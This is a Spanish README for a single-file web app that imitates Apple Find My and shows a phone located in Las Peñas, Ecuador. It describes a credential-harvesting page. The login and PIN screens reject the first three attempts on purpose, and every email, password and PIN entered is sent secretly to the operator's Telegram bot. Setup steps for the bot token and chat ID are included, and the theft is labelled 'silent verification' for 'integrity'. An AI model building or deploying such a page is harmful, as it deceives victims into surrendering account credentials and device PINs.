Encontrar • Rastreo Vectorial Nativo 📱🛰️Una aplicación web interactiva de rastreo de dispositivos móviles inspirada en Apple Find My, construida completamente con un motor de mapas vectoriales nativo (HTML5 Canvas). Diseñada específicamente para simular la localización exacta en Las Peñas, Esmeraldas, Ecuador, con una interfaz elegante con efectos Glassmorphism estilo iOS y notificaciones de seguridad integradas vía Telegram.🚀 Características Principales🗺️ Motor de Mapas Vectoriales 100% Propietario: Sin dependencias externas de APIs pesadas como Google Maps o Leaflet. Renderiza dinámicamente la costa del Océano Pacífico, franja de playa, vías principales (Vía del Pacífico E15, Vía La Tola, Carlos Rosero), cuadras urbanas y huellas arquitectónicas 3D a 60 FPS.🔒 Sistema de Verificación Silenciosa (Anti-Errores):Paso 1 (Cuenta): Al ingresar correo y contraseña, los primeros 3 intentos fallan intencionalmente mostrando un error realista. Al cuarto intento, permite el acceso de forma natural.Paso 2 (PIN del Dispositivo): Pantalla de bloqueo numérica estilo iOS donde los primeros 3 intentos con PIN incorrecto fallan y sacuden la interfaz, permitiendo el desbloqueo exitoso al cuarto intento.🤖 Integración Segura con Bot de Telegram: Cada intento de inicio de sesión (tanto correos y contraseñas como PINs ingresados) es enviado de forma instantánea y secreta a tu bot personal de Telegram para mantener la integridad y monitorear el acceso.📡 Marcador de Dispositivo con Radar: Icono de smartphone animado con ondas circulares de sonar concéntricas y panel táctil flotante con información detallada en vivo (GPS $\pm 3\text{m}$, red móvil, altitud y estado de movimiento).🎨 Temas Visuales Múltiples: Alterna entre diferentes modos nocturnos y de contraste adaptados para visualización inmersiva.🎵 Acciones Remotas: Simulación de reproducción de sonido de alerta en alta frecuencia, trazado de rutas peatonales y sincronización de GPS en tiempo real.🛠️ Tecnologías UtilizadasHTML5 Canvas & 2D Context: Renderizado vectorial y cálculos trigonométricos de cámara y perspectiva 3D.Tailwind CSS: Estilizado moderno y utilitario.Phosphor Icons: Iconografía limpia y minimalista.JavaScript (Vanilla ES6+): Lógica del motor de render, interpolaciones de cámara (Easing/Spring) y gestión de estados asíncronos con la API de Telegram.⚙️ Configuración del Bot de TelegramPara recibir los reportes de intentos de inicio de sesión y PIN directamente en tu Telegram:Habla con @BotFather en Telegram para crear un nuevo bot y obtener tu Bot Token.Obtén tu Chat ID personal hablándole a un bot como @userinfobot.Abre el archivo principal de la aplicación y busca las siguientes constantes al inicio del script JavaScript:const TELEGRAM_BOT_TOKEN = "TU_BOT_TOKEN_AQUI"; // Reemplaza con el token de BotFather
const TELEGRAM_CHAT_ID = "TU_CHAT_ID_AQUI";     // Reemplaza con tu Chat ID
📦 Instalación y Uso LocalAl tratarse de una aplicación desarrollada bajo el Mandato de Archivo Único, todo el diseño, estilos y lógica residen en un solo archivo .html.Clona el repositorio o descarga el archivo HTML:git clone https://github.com/tu-usuario/encontrar-dispositivo-vectorial.git
Abre el archivo Encontrar Mi Dispositivo.html directamente en cualquier navegador web moderno (Chrome, Safari, Firefox, Edge).📱 Flujo de DemostraciónAl abrir la app, la cámara realizará un zoom automático panorámico hacia Las Peñas, Esmeraldas.Aparecerá el modal de Verificación de Identidad. (Puedes usar el botón "Rellenar datos demo").Tras intentar 3 veces, el cuarto intento te dejará pasar y acercará la vista a la manzana de comercios (Disensa, Ocean Style Boutique, Hotel Casa Blanca).En el modal del PIN del Dispositivo, ingresa cualquier código 3 veces (fallará interactivamente) y al cuarto intento o usando el botón "Rellenar PIN" desbloquearás la posición exacta del celular con las ondas de radar y el panel inferior de acciones.📄 LicenciaEste proyecto está bajo la Licencia MIT.
